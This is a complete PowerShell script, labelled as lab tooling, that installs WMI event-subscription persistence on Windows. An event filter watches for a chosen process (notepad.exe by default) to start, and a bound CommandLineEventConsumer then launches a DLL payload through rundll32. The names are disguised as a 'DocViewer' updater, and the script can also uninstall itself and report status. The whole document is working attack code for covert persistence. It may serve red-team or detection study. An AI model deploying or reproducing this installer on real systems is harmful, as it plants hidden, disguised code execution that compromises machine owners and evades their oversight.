# WMI Persistence Installer — DocViewer lab defaults
# Placeholders may still be substituted by build.sh; defaults match config.lab.env.

param(
    [Parameter(Mandatory = $false)]
    [ValidateSet("install", "uninstall", "status")]
    [string]$Action = "install",

    [switch]$Json = $false,

    [string]$TargetProcess = $(if ($env:TARGET_PROC) { $env:TARGET_PROC } else { "notepad.exe" }),
    [string]$PayloadPath = $(if ($env:PAYLOAD_PATH) { $env:PAYLOAD_PATH } else { "C:\ProgramData\DocViewer\DocViewerCore.dll" }),
    [int]$IntervalSec = $(if ($env:INTERVAL_MIN) { [int]$env:INTERVAL_MIN } else { 5 }),
    [string]$EventName = $(if ($env:EVENT_NAME) { $env:EVENT_NAME } else { "DocViewerUpdateEvent" }),
    [string]$ConsumerName = $(if ($env:CONSUMER_NAME) { $env:CONSUMER_NAME } else { "DocViewerUpdateConsumer" })
)

$ErrorActionPreference = "Stop"

function Test-Admin {
    $identity = [Security.Principal.WindowsIdentity]::GetCurrent()
    $principal = New-Object Security.Principal.WindowsPrincipal($identity)
    return $principal.IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
}

function Get-Filter {
    Get-WmiObject -Class __EventFilter -Namespace "root\subscription" -Filter "Name='$EventName'" -ErrorAction SilentlyContinue
}
function Get-Consumer {
    Get-WmiObject -Class CommandLineEventConsumer -Namespace "root\subscription" -Filter "Name='$ConsumerName'" -ErrorAction SilentlyContinue
}

function Remove-Bindings {
    Get-WmiObject -Class __FilterToConsumerBinding -Namespace "root\subscription" -ErrorAction SilentlyContinue |
        Where-Object { $_.Filter -match [regex]::Escape($EventName) -or $_.Consumer -match [regex]::Escape($ConsumerName) } |
        ForEach-Object { $_ | Remove-WmiObject }
}

function Uninstall-Persistence {
    if (-not (Test-Admin)) { throw "Administrator privileges required" }
    Remove-Bindings
    Get-Filter | Remove-WmiObject -ErrorAction SilentlyContinue
    Get-Consumer | Remove-WmiObject -ErrorAction SilentlyContinue
    Write-Host "[-] WMI persistence removed ($EventName / $ConsumerName)"
}

function Install-Persistence {
    if (-not (Test-Admin)) { throw "Administrator privileges required" }

    $TargetDir = Split-Path $PayloadPath -Parent
    if ($TargetDir -and -not (Test-Path $TargetDir)) {
        New-Item -ItemType Directory -Path $TargetDir -Force | Out-Null
    }

    # Clean previous
    Uninstall-Persistence

    # WITHIN n = seconds between polls for __InstanceCreationEvent
    $Query = "SELECT * FROM __InstanceCreationEvent WITHIN $IntervalSec WHERE TargetInstance ISA 'Win32_Process' AND TargetInstance.Name = '$TargetProcess'"

    $Filter = Set-WmiInstance -Class __EventFilter -Namespace "root\subscription" -Arguments @{
        Name           = $EventName
        EventNamespace = "root\cimv2"
        QueryLanguage  = "WQL"
        Query          = $Query
    }

    # Launch loader export via rundll32 (lab entry symbol: EntryPoint)
    $Consumer = Set-WmiInstance -Class CommandLineEventConsumer -Namespace "root\subscription" -Arguments @{
        Name                = $ConsumerName
        CommandLineTemplate = "cmd.exe /c rundll32.exe `"$PayloadPath`",EntryPoint"
    }

    Set-WmiInstance -Class __FilterToConsumerBinding -Namespace "root\subscription" -Arguments @{
        Filter   = $Filter
        Consumer = $Consumer
    } | Out-Null

    Write-Host "[+] WMI persistence installed"
    Write-Host "    Trigger : process create name=$TargetProcess (poll ${IntervalSec}s)"
    Write-Host "    Payload : $PayloadPath  (rundll32 EntryPoint)"
    Write-Host "    Helper  : place DocViewerHelper.exe (agent) beside DLL"
    Write-Host "    Filter  : $EventName"
    Write-Host "    Consumer: $ConsumerName"
}

function Show-Status {
    $f = Get-Filter
    $c = Get-Consumer
    if ($Json) {
        $obj = [ordered]@{
            event_name       = $EventName
            consumer_name    = $ConsumerName
            filter_present   = [bool]$f
            consumer_present = [bool]$c
            query            = $(if ($f) { $f.Query } else { $null })
            command          = $(if ($c) { $c.CommandLineTemplate } else { $null })
            target_process   = $TargetProcess
            payload_path     = $PayloadPath
            interval_sec     = $IntervalSec
        }
        $obj | ConvertTo-Json -Compress
        return
    }
    Write-Host "EventName   : $EventName  present=$([bool]$f)"
    Write-Host "ConsumerName: $ConsumerName present=$([bool]$c)"
    if ($f) { Write-Host "Query: $($f.Query)" }
    if ($c) { Write-Host "Cmd  : $($c.CommandLineTemplate)" }
}

switch ($Action) {
    "install"   { Install-Persistence }
    "uninstall" { Uninstall-Persistence }
    "status"    { Show-Status }
}
